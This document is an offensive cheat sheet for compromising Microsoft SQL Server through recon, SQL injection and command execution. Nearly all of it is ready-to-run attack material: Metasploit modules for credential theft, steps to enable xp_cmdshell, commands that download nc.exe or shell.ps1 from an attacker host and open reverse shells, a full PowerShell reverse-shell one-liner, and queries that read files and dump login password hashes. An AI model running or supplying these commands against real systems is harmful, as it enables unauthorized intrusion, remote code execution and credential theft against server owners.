# sqli ms-sql

## Recon

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 IP
```

## msf modules
* Login check: `use auxiliary/scanner/mssql/mssql_login`
* Steal NTLM-creds: `use auxiliary/admin/mssql/mssql_ntlm_stealer`
  * Start responder: `sudo responder -I tun0`

## [mssqlclient.py](https://github.com/SecureAuthCorp/impacket)

```bash
mssqlclient.py DOMAIN/USER:PASS@$IP [-port <>] [-windows-auth]
```

## Privilege checks

```bash
# to see if we are sysadmin
# returns 1
SELECT IS_SRVROLEMEMBER ('sysadmin')
SELECT IS_SRVROLEMEMBER('sysadmin', 'sa')
SELECT name FROM master..syslogins WHERE sysadmin = '1'
```

## EXEC

### xp_cmdshell

```bash
EXEC sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell "whoami";

# shells
EXEC xp_cmdshell "powershell -c (New-Object System.Net.WebClient).DownloadFile('http://IP/nc.exe','c:\Users\Public\nc.exe');"
EXEC xp_cmdshell "c:\Users\Public\nc.exe -e cmd.exe IP PORT"
[OR]
$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
EXEC xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://IP/shell.ps1');"
```

### external_scripts

```bash
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
```

## ms-sql commands

```bash
# comments
--
/* <blah> */

# hostname
@@servername
host_name()

# version
@@version

# read-file
# [C:\boot.ini] OR [C:\\boot.ini]
CREATE TABLE kashz (line varchar(8000));
BULK INSERT kashz FROM '<FILE>';
DROP TABLE kashz;

# users
user_name()
system_user
user [user()]
| SELECT name FROM master..syslogins

# password (SHA-1)
# master.dbo.fn_varbintohexstr(password) => pass to hex-str
# master.sys.fn_varbintohexstr(password_hash) => pass to hex-str
| SELECT name, password FROM master..sysxlogins
| SELECT name, password_hash FROM master.sys.sql_logins

# databases
DB_NAME()
| SELECT name FROM master.sys.databases
| SELECT name FROM master.dbo.sysdatabases
| SELECT name FROM master ..sysdatabases
| EXEC sp_databases
SELECT DB_NAME(N)        # for N:1-n

# tables
SELECT name FROM <DB>..sysobjects WHERE xtype='U'

# cols
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name ='<TABLE>')
SELECT <DB>..syscolumns.name, TYPE_NAME(<DB>..syscolumns.xtype) FROM <DB>..syscolumns, <DB>..sysobjects WHERE <DB>..syscolumns.id=<DB>..sysobjects.id AND <DB>..sysobjects.name='<TABLE>'

# 9th row
SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) ORDER BY name DESC
```

## Database File Paths

* [practicalsbs.wordpress.com/sql-server-file-locations-for-default-instances/](https://practicalsbs.wordpress.com/2016/07/03/sql-server-file-locations-for-default-instances/)

```bash
\DATA\master.mdf
\BACKUP\master.mdf
```

## Error-based

Refer: [perspectiverisk.com/mssql-practical-injection-cheat-sheet/](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)

```bash
# encode + as %2b if doing url-based.
# force the query to run and show output in error page
convert(int, @@version)--
```

## Full pwnage guide

* [exploit-db.com/12975](https://www.exploit-db.com/papers/12975)

## .mdf extract

* [xpn/Powershell-PostExploitation](https://github.com/xpn/Powershell-PostExploitation)
* **known bug:** [xpn/Powershell-PostExploitation/issues/3](https://github.com/xpn/Powershell-PostExploitation/issues/3)

```bash
# fix in code
[System.Reflection.Assembly]::UnsafeLoadFrom($PSScriptRoot + "\OrcaMDF.RawCore.dll") | Out-Null
[System.Reflection.Assembly]::UnsafeLoadFrom($PSScriptRoot + "\OrcaMDF.Framework.dll") | Out-NUll
```

* [blog.xpnsec.com/extracting-master-mdf-hashes/](https://blog.xpnsec.com/extracting-master-mdf-hashes/)